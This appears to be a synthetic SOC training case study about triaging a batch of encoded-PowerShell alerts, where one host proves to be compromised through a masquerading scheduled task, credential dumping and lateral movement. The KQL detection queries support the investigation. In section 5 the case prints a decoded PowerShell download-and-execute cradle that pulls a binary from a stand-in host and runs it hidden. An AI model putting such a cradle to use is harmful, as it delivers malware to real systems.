---
title: "CB-04 — Encoded, But Not by SCCM"
case_id: "CB04"
category: "Endpoint"
disposition: "True Positive"
outcome_flavor: "Obvious"
confidence_at_close: "High"
entry_point: "standing-alert"
construction_class: "SYNTHETIC-COMPOSITE"
author: "author-agent"
reviewer: "technical-reviewer-agent"
status: "reviewed"
last_validated: "2026-09-16"
depends_on: ["SOC Playbook Handbook encoded-obfuscated-powershell.md (EP-003)", "SOC Playbook Handbook powershell-download-cradle.md (EP-004)", "SOC Playbook Handbook scheduled-task-persistence.md (EP-018)", "SOC Playbook Handbook credential-dumping-lsass-access-mimikatz-indicators.md (EP-020)", "DEH V2 Part 10", "DEH V2 Part 11"]
---

# CB-04 — Encoded, But Not by SCCM

*This is a synthetic, composite investigation, built by threading together mechanics from
several of this series' own playbooks and detections into one continuous narrative.
"Ridgeline Auto Supply," its staff, and every host, account, domain, and IP address named
below are invented; no real organization, employee, incident, or breach is depicted or
implied.*

## Why this case exists

SOC Playbook Handbook `25-false-positive-engineering-case-studies.md` (Case Study 3) closes
an encoded-PowerShell alert as Expected Activity once the analyst confirms the parent process
is `ccmexec.exe`, the timing matches an approved change ticket, and the decoded content is a
routine inventory script pushed to hundreds of hosts in one deployment window. That case study
is correct, and it is also the single most useful piece of institutional memory an analyst
carries into the next encoded-PowerShell alert — which is exactly the problem this case
explores. This case opens on a night that looks, at a glance, like that same story: a batch of
encoded-PowerShell alerts, all landing within one correlation window, most of them explained
by one legitimate change ticket. One alert in the batch doesn't belong to it, and the entire
investigation turns on whether the analyst checks that one host's own evidence or lets the
batch's shape do the triaging. This case does not re-derive EP-003's detection logic, EP-004's
download-cradle indicators, EP-018's scheduled-task investigation steps, or EP-020's LSASS
access-mask table — all four are cited by ID at the point the investigation actually needs
them, never rebuilt from scratch. It also does not re-teach what Script Block Logging captures
or how the endpoint analytic layer reasons about process lineage across a fleet; Detection
Engineering Handbook V2 Part 10 and Part 11 own that telemetry and analytic depth. What this
case narrates instead is the specific triage discipline the false-positive case study's own
existence quietly encourages an analyst to skip: checking the one host that doesn't fit the
pattern, instead of trusting the pattern.

## Case metadata

| Field | Value |
|---|---|
| Case ID | `CB-04` |
| Category | Endpoint |
| Disposition | True Positive |
| Outcome flavor | Obvious |
| Confidence at close | High, settled |
| Entry point | EDR alert on encoded PowerShell (EP-003 detection logic), arriving inside a batch of alerts mostly explained by an unrelated change ticket |
| Primary log sources | EDR/Sysmon process-creation and network telemetry, PowerShell Script Block/Module Logging, Windows Security event log (scheduled-task and logon events), ITSM change-ticket record, AD organizational-unit membership, EDR credential-access (LSASS) telemetry |
| Construction class | SYNTHETIC — COMPOSITE ACROSS SERIES |
| Primary cross-references | SOC Playbook Handbook `encoded-obfuscated-powershell.md` (EP-003), `powershell-download-cradle.md` (EP-004), `scheduled-task-persistence.md` (EP-018), `credential-dumping-lsass-access-mimikatz-indicators.md` (EP-020); DEH V2 Part 10 — PowerShell Detection Engineering; DEH V2 Part 11 — Endpoint Detection Engineering |
| All times | UTC |

## 1. Alert: a night that already looks like SCCM

**[CONCEPT]** Encoded PowerShell is ambiguous by design, not by accident — the `-EncodedCommand`
flag exists because plenty of legitimate deployment tooling needs to survive remote-session
quoting and escaping, not because every use of it is an attacker hiding something. SOC
Playbook Handbook EP-003 — Encoded/Obfuscated PowerShell Execution owns the full detection
logic and the false-positive/true-positive indicator tables for this alert type; this case
only needs the reader to know the alert fires on the pattern, not on intent, and that intent
is exactly what the analyst has to establish afterward.

At 01:52 UTC, Ridgeline Auto Supply's SOC queue started filling with EP-003 alerts out of the
Fairview distribution center — a batch that would eventually total sixty-three hosts, all in
the Finance organizational unit, all triggered by the same CAB-approved deployment: change
ticket CHG-58217, a reporting-suite update pushed via the Configuration Manager client that
night. Priya Nandy, the sole analyst on the overnight shift, had triaged this exact shape of
batch before — an encoded command line, a management-agent parent process, a wave of
near-identical alerts inside a twenty-to-forty-minute window. Twelve of the sixty-three had
already been confirmed against the ticket and closed as Expected Activity by 02:10 UTC. At
02:14:02 UTC, alert sixty-four landed in the same queue: `WKS-WH-014`, encoded PowerShell,
same alert rule.

```text
// EDR alert queue, Fairview distribution center, 2026-08-19
02:09:41Z host=WKS-FIN-118 rule=EP-003 parent=ccmexec.exe user=NT AUTHORITY\SYSTEM
02:09:58Z host=WKS-FIN-119 rule=EP-003 parent=ccmexec.exe user=NT AUTHORITY\SYSTEM
02:10:22Z host=WKS-FIN-121 rule=EP-003 parent=ccmexec.exe user=NT AUTHORITY\SYSTEM
02:10:55Z host=WKS-FIN-124 rule=EP-003 parent=ccmexec.exe user=NT AUTHORITY\SYSTEM
02:14:02Z host=WKS-WH-014  rule=EP-003 parent=svchost.exe user=NT AUTHORITY\SYSTEM
```

## 2. First observation: the host that doesn't belong to the batch

**[ANALYST]** The question worth asking before touching a second data source wasn't "is this
alert real" — it was "is this alert actually part of the batch it looks like it's part of."
Everything about `WKS-WH-014`'s alert matched the *shape* of the other sixty-three: same
detection rule, same rough time window, same `SYSTEM`-context execution. Two things didn't
match. `WKS-WH-014` carried a `WH` prefix, not `FIN` — Ridgeline's naming convention put
warehouse and dispatch terminals in one fleet and finance workstations in another, and the two
had never shared a deployment ring. And the parent process was `svchost.exe`, not
`ccmexec.exe`. EP-003's own Normal-vs-Suspicious guidance treats a known management-agent
parent as the strongest single benign indicator; `svchost.exe` hosting the Schedule service is
a different lineage entirely — it means a scheduled task fired this, not the Configuration
Manager client.

> **Analyst's Gut Check**
> When a batch of alerts shares one rule and one rough time window, check every host's own
> ticket and OU before closing any of them by the batch's shape. A tired 2 a.m. queue rewards
> pattern-matching the whole batch at once; the one host that doesn't actually belong to it is
> exactly the one a pattern-match triage buries.

Two questions followed directly from that mismatch: was `WKS-WH-014` somehow included in
CHG-58217 despite the naming convention, and — regardless of the ticket — what actually
launched this instance of `powershell.exe` if it wasn't the Configuration Manager client.

## 3. Pivot: the change ticket and the OU that wasn't in it

**[PIVOT]** Confirming or ruling out "this is CHG-58217, the ticket's scope just missed one
host" required the ITSM record itself, not another EDR query — the EDR alert has no visibility
into what a human approved.

```text
// ITSM ticket excerpt — CHG-58217
Status: Approved / Implemented
Change window: 2026-08-19 01:30–03:00 UTC
Scope: Finance OU collection "FIN-Workstations-All" (63 endpoints)
Package: ReportSuite_v14.2_ConfigPush.msi, deployed via CM client (ccmexec.exe)
Approved by: J. Okafor, IT Change Manager
```

```text
// AD OU membership, WKS-WH-014
distinguishedName: CN=WKS-WH-014,OU=Warehouse,OU=Sites,DC=ridgelineauto,DC=example
```

The ticket's scope was a named collection, not a loosely worded description that could have
accidentally swept in an unrelated host — `WKS-WH-014` was never a candidate for CHG-58217
under any reading of the ticket. That ruled out the simplest, most comfortable version of
Hypothesis 1 immediately: this wasn't a scoping typo.

**[HYPOTHESIS]** Two theories were live from this point forward, and they made different
predictions about everything still to be checked. **Hypothesis 1 — this is still tonight's
approved deployment, just executed through an unusual path the ticket doesn't describe** (for
example, a second, undocumented step in the same maintenance window). That theory predicts the
decoded PowerShell content will be the same benign `ReportSuite` configuration script running
everywhere else tonight, regardless of what kicked it off. **Hypothesis 2 — this is unrelated
to CHG-58217 and something else created a scheduled task on this host to run PowerShell under
`SYSTEM` context.** That theory predicts the decoded content will have nothing to do with the
Finance reporting suite, and that whatever created the task will not trace back to any
approved change record.

> **Hypothesis Board — after the ticket and OU pivot**
> 1. **Same approved deployment, unusual execution path** — weakened to the point of having
>    nowhere left to go. The ticket's own scope is a named 63-host collection that never
>    included `WKS-WH-014`, and the parent-process lineage already breaks from every other
>    alert in the batch.
> 2. **Unrelated scheduled-task execution, not covered by any change record** — favored. The
>    ticket's exclusion of this host is direct, host-specific evidence, not an inference; what
>    it doesn't yet confirm is what the task actually runs.
> **Current confidence:** Medium, rising.

## 4. Pivot: the scheduled task behind the process

**[PIVOT]** A `svchost.exe`-parented PowerShell process almost always traces back to a
scheduled task. SOC Playbook Handbook EP-018 — Scheduled Task Persistence owns the full
investigation sequence for that trace; the first step of it is the Windows Security Event ID
4698 record for the task itself, pulled by host and timeframe.

```kql
SecurityEvent
| where EventID == 4698
| where Computer == "WKS-WH-014"
| where TimeGenerated between (datetime(2026-08-19T01:45:00Z) .. datetime(2026-08-19T02:15:00Z))
| project TimeGenerated, SubjectUserName, SubjectDomainName, TaskName, TaskContent
```

```text
TimeGenerated:    2026-08-19T02:11:47Z
SubjectUserName:  svc-whauto
SubjectDomainName: RIDGELINEAUTO
TaskName:         \DellCommandUpdateHelper
TaskContent (Action → Exec):
  Command:   powershell.exe
  Arguments: -nop -w hidden -enc <base64, 640 chars>
  WorkingDirectory: C:\Users\Public\update\
```

`svc-whauto` was not an unfamiliar account — it was Ridgeline's warehouse automation service
account, used legitimately to reset barcode-scale calibration and restart label-printer queues
on a schedule, and it did have local admin rights on warehouse terminals for exactly that
reason. That gave Hypothesis 1 a brief second life in a different shape: maybe this wasn't
CHG-58217, but it could still be a separate, legitimate automated task — Ridgeline's
warehouse hardware fleet did run Dell Command Update on a schedule, and `svc-whauto` was one of
the accounts authorized to trigger it.

> **Dead End**
> Twenty minutes went into checking whether `DellCommandUpdateHelper` was a legitimate,
> if unfamiliar, Dell Command Update automation task. Ridgeline's approved-software inventory
> does list Dell Command Update for warehouse hardware refreshes, and `svc-whauto` is one of
> the accounts permitted to run it. It wasn't that. Dell Command Update's actual scheduled task
> is named `DellCommandUpdate`, not `DellCommandUpdateHelper` — confirmed against the vendor's
> own deployment documentation — and the approved package's file hash didn't match anything
> referenced in this task's action. The name was close enough to pattern-match on a tired
> read-through and nothing more; the real task doesn't exist under this name anywhere in
> Ridgeline's environment.

Between the ticket that didn't cover this host and a task name that mimicked, but didn't match,
Ridgeline's own approved automation, Hypothesis 1 no longer had anywhere left to go. What
remained unanswered was simpler and more direct: what does the encoded command actually do.

> **Hypothesis Board — after the task-creation pivot**
> 1. **Legitimate deployment or automation, under a name that only looks unfamiliar** — ruled
>    out. Neither CHG-58217 nor the approved Dell Command Update package accounts for a task
>    named `DellCommandUpdateHelper` staged out of `C:\Users\Public\update\`.
> 2. **Unrelated task execution, created under a compromised or misused service-account
>    context** — supported. A masquerading task name, a public, world-writable staging path,
>    and a `SYSTEM`-context encoded PowerShell action with no corroborating change record.
> **Current confidence:** Medium, rising.

## 5. Pivot: decoding the payload

**[PIVOT]** The task's action told Priya *that* something ran; it didn't yet say *what*.
DEH V2 Part 10 — PowerShell Detection Engineering covers why Script Block Logging, not the raw
command line, is the source that actually resolves an encoded blob to readable content; EP-003
names the same event as its primary content source. The first pull, scoped only by host and a
wide time window, was far too broad to read through:

```kql
// too broad — see next query
Event
| where Computer == "WKS-WH-014"
| where EventID == 4104
| where TimeGenerated between (datetime(2026-08-19T00:00:00Z) .. datetime(2026-08-19T04:00:00Z))
// → 1,190 rows: module-load noise, unrelated scripts, and the target buried somewhere inside
```

Narrowing to the `ScriptBlockId` tied to the flagged process, correlated by `ProcessId` off the
Sysmon Event ID 1 record for the `powershell.exe` launch, returned the three script-block
fragments that made up the actual payload:

```powershell
# reconstructed from Event ID 4104, ScriptBlockId 8e2c9f4a-...
$u = 'https://cdn-update-assets.example/a1/pkg.bin'
$c = New-Object Net.WebClient
$b = $c.DownloadData($u)
[IO.File]::WriteAllBytes('C:\Users\Public\update\taskhostw32.exe', $b)
Start-Process 'C:\Users\Public\update\taskhostw32.exe' -WindowStyle Hidden
```

There was nothing here resembling `ReportSuite_v14.2_ConfigPush`, or any inventory or
configuration script — this decoded to a download-and-execute cradle, the pattern SOC Playbook
Handbook EP-004 — PowerShell Download Cradle names directly. Sysmon Event ID 3 for the same
process ID confirmed the outbound half of it:

```text
2026-08-19T02:14:09Z proc=powershell.exe pid=6812 dst=203.0.113.77 dport=443 proto=TLS
2026-08-19T02:14:11Z FileCreate path=C:\Users\Public\update\taskhostw32.exe hash=SHA256:9f3a...
```

This is T1105 (Ingress Tool Transfer) riding on T1059.001 (Command and Scripting Interpreter:
PowerShell), with the encoding itself covering T1027 (Obfuscated Files or Information) — three
techniques the decoded content settled at once, none of them requiring further inference.

> **Evidence Note**
> Script Block Logging had only been enabled fleet-wide across Ridgeline's warehouse OU for
> six weeks, following an engineering push that closed a coverage gap flagged in an earlier
> audit. Had `WKS-WH-014` still been on the prior GPO baseline, this pivot would have returned
> nothing readable — a command-line fragment with `-enc` and no way to see past it — and this
> case would have had to close on inference rather than a decoded payload. The six-week-old
> rollout is the specific reason this investigation had direct evidence to work with instead
> of a logging gap.

**Confidence: Medium-High, rising.** The decoded content had no relationship to CHG-58217, no
relationship to Dell Command Update, and matched a download-cradle pattern with a live outbound
connection — three separate facts agreeing, all from the endpoint's own telemetry.

## 6. Additional evidence: LSASS access

**[PIVOT]** A download cradle that fetches and runs a second-stage binary raises an immediate
follow-up question: what does the second stage do. SOC Playbook Handbook EP-020 — Credential
Dumping / LSASS Access / Mimikatz Indicators covers exactly this pivot — from an
execution-and-persistence chain to the credential-access telemetry that would confirm or rule
out the next stage of it.

```kql
Sysmon
| where EventID == 10
| where Computer == "WKS-WH-014"
| where TargetImage has "lsass.exe"
| where TimeGenerated between (datetime(2026-08-19T02:14:00Z) .. datetime(2026-08-19T02:30:00Z))
| project TimeGenerated, SourceImage, GrantedAccess, CallTrace
```

```text
TimeGenerated:  2026-08-19T02:16:53Z
SourceImage:    C:\Users\Public\update\taskhostw32.exe
TargetImage:    C:\Windows\System32\lsass.exe
GrantedAccess:  0x1438
CallTrace:      UNKNOWN(C:\Users\Public\update\taskhostw32.exe+0x2a10)|ntdll.dll+0x9d3a4
```

`0x1438` is the classic duplicate-handle mask EP-020's own reference table flags as a
dump-tool pattern, not a query-only access — and the source binary's own name, `taskhostw32.exe`,
was itself a small piece of misdirection: `taskhostw.exe` is the legitimate process EP-018
names as a normal parent when a scheduled task's action actually fires. Whoever built this
payload picked a name expected to read as routine to an analyst who'd just spent the last hour
looking at exactly that kind of process lineage. Sysmon Event ID 11 showed a dump-style file
written to the same staging folder one second later, and Sysmon Event ID 23 showed it deleted
forty seconds after that — the write-then-delete pattern EP-020 lists as a direct true-positive
indicator, not an ambiguous one.

```text
2026-08-19T02:16:54Z FileCreate path=C:\Users\Public\update\~dbg1.tmp size=41,882,112
2026-08-19T02:17:34Z FileDelete path=C:\Users\Public\update\~dbg1.tmp
```

This is T1003.001 (OS Credential Dumping: LSASS Memory) with clean, direct evidence: an
unsigned, renamed binary, a high-risk access mask, and a dump artifact that existed just long
enough to be read and removed. **Confidence: Medium-High, still rising, but not yet High** — the
evidence so far all comes from one telemetry family, the endpoint's own EDR/Sysmon feed. A
second, independent source hadn't weighed in yet.

## 7. Pivot: the credential's second stop

**[PIVOT]** A dump with no follow-on use is a smaller, if still serious, problem than one
that's already been spent. Confirming or ruling that out meant leaving the endpoint telemetry
entirely for the Windows Security authentication log — a genuinely independent source from
everything checked so far, since it comes from the domain controllers, not from `WKS-WH-014`
itself.

```kql
SecurityEvent
| where EventID in (4624, 4648)
| where TargetUserName in ("svc-whauto", "j.reyes")
| where TimeGenerated between (datetime(2026-08-19T02:16:00Z) .. datetime(2026-08-19T03:16:00Z))
| project TimeGenerated, EventID, TargetUserName, LogonType, WorkstationName, IpAddress
```

```text
2026-08-19T02:26:41Z EventID=4624 TargetUserName=j.reyes LogonType=3
  WorkstationName=WKS-OPS-031 IpAddress=192.0.2.203
2026-08-19T02:26:44Z EventID=4648 TargetUserName=j.reyes
  ProcessName=C:\Windows\System32\net.exe TargetServer=WKS-OPS-031
```

`j.reyes` was the overnight dispatch shift supervisor — logged in interactively on `WKS-WH-014`
at the time of the LSASS access, which put their cached credential material squarely inside
what the dump would have captured. A 90-day baseline pull for the account showed zero prior
authentications to `WKS-OPS-031`, an operations jump host `j.reyes` had no job-related reason to
touch. This is T1550.002 (Use Alternate Authentication Material: Pass the Hash) — a harvested
account showing up somewhere it had never been before, within ten minutes of the dump that
would have exposed it.

> **Hypothesis Board — after the authentication pivot**
> 1. **Legitimate deployment or automation** — ruled out. Confirmed at the ticket, task-name,
>    and decoded-payload stages; nothing left to re-open it.
> 2. **Compromised service-account context used to plant a download-cradle-to-credential-theft
>    chain** — supported. Two independent sources — the endpoint's Sysmon telemetry and the
>    domain's own authentication log — agree on the same account, the same short window, and
>    the same destination, with no contradicting evidence from either.
> **Current confidence:** High.

## 8. Escalation and containment

**[ESCALATION]** At 02:41 UTC, with a confirmed download-cradle-to-LSASS-access chain on
`WKS-WH-014` and confirmed follow-on authentication to `WKS-OPS-031`, Priya escalated as a
True Positive, High severity, per the combined escalation criteria in EP-003, EP-018, and
EP-020 — active credential access with follow-on use of the harvested material clears all
three playbooks' immediate-escalation bar on its own. Containment followed the authority each
playbook already assigns at Tier 1/2 level, with no additional sign-off needed for the actions
taken in the first ten minutes: both `WKS-WH-014` and `WKS-OPS-031` were isolated via EDR, the
`DellCommandUpdateHelper` task was deleted (Windows Event ID 4699) with the full task XML
preserved as evidence first, and the `taskhostw32.exe` hash was pushed to the fleet-wide
blocklist.

Two actions needed sign-off beyond the analyst's own authority, per EP-020's own containment
table: rotating `svc-whauto`'s credentials required IAM execution with IR-lead approval, since a
shared automation account ties into other warehouse jobs and an ad hoc reset could break them
without notice; and disabling `j.reyes`'s account required the account owner's manager, given
the shift-coverage impact of pulling a supervisor's access mid-shift. Both were opened as
tracked tickets rather than actioned unilaterally, exactly the boundary EP-020 draws between
what a Tier 1/2 analyst can do alone and what needs a named approver.

A fleet-wide hunt for the same task name, file hash, and staging path — the step both EP-003
and EP-018 call for once a single-host finding is confirmed — returned clean: no other host in
any OU showed `DellCommandUpdateHelper`, the `taskhostw32.exe` hash, or a connection to
`cdn-update-assets.example`. This stayed a single-host incident.

## 9. Decision and closure

**[ESCALATION]** **Disposition: True Positive.** **Outcome flavor: Obvious.** Every hypothesis genuinely worth
carrying forward collapsed in the same direction once the task content, the decoded payload,
and the authentication log were checked directly, and the two claims this case rests on — that
the chain is real, and that it stayed on two hosts — each have direct, independent, agreeing
evidence with no unresolved contradiction. **Confidence at close: High, settled.**

> **Blind Spot**
> This case's evidence confirms what `svc-whauto`'s session did once it created the task, and
> where the harvested credential went afterward. It does not establish how `svc-whauto`'s own
> credential was obtained in the first place — no email gateway, VPN, or remote-access log was
> pulled during this investigation, because the scope stayed endpoint- and identity-telemetry
> only once the chain was confirmed. Whether that account's password was phished, brute-forced,
> or reused from an unrelated breach is a separate question this evidence set was never built
> to answer.

> **What Would Change My Mind**
> This closes at High confidence on the chain itself — download cradle, LSASS access, and
> follow-on authentication all agree, from independent sources, with no gap. It would take a
> specific new fact to revise that: a signed, ticketed explanation for `taskhostw32.exe`
> surfacing after the fact would reopen the credential-access finding, though nothing in
> today's evidence points that direction. The genuinely open question is the initial-access
> vector for `svc-whauto`'s own credential — a phishing hit, a credential-stuffing match, or a
> reused password from an unrelated exposure would each point IR's follow-on work in a
> different direction, and none of them is ruled in or out by anything gathered here.

## 10. Lesson learned

**[LESSON LEARNED]** The technical chain in this case — an encoded PowerShell download cradle,
a masquerading scheduled task, and a follow-on LSASS access — is exactly the shape EP-003,
EP-018, and EP-020 already describe on their own, and DEH V2 Part 11's cross-OS persistence and
credential-access analytic layer treats as a standard, expected combination. What generalizes
past this one warehouse terminal is the triage risk that almost buried it: a batch of alerts
sharing one rule and one rough time window will always contain the occasional alert that only
looks like it belongs to the batch, and the cost of checking each host's own ticket, OU, and
task content individually is a few minutes against a queue of sixty-plus alerts — cheap next
to the cost of pattern-matching a real intrusion into the same bucket as a routine change
window. The permanent fix isn't a new detection; EP-003's own false-positive-engineering
treatment already shows the tuned version of this exact discipline, joining the alert against
the change record and the approved-package hash per host rather than per rule. This case is
the argument for actually running that join every time, on every host in the batch, rather than
extending the benefit of the doubt from the sixty-three hosts that matched the ticket to the
one that didn't.

---

**Cross-references:** SOC Playbook Handbook EP-003 — Encoded/Obfuscated PowerShell Execution
(`encoded-obfuscated-powershell.md`); EP-004 — PowerShell Download Cradle
(`powershell-download-cradle.md`); EP-018 — Scheduled Task Persistence
(`scheduled-task-persistence.md`); EP-020 — Credential Dumping / LSASS Access / Mimikatz
Indicators (`credential-dumping-lsass-access-mimikatz-indicators.md`); SOC Playbook Handbook
`25-false-positive-engineering-case-studies.md` (Case Study 3, mirrored and inverted, not
re-narrated); DEH V2 Part 10 — PowerShell Detection Engineering; DEH V2 Part 11 — Endpoint
Detection Engineering.
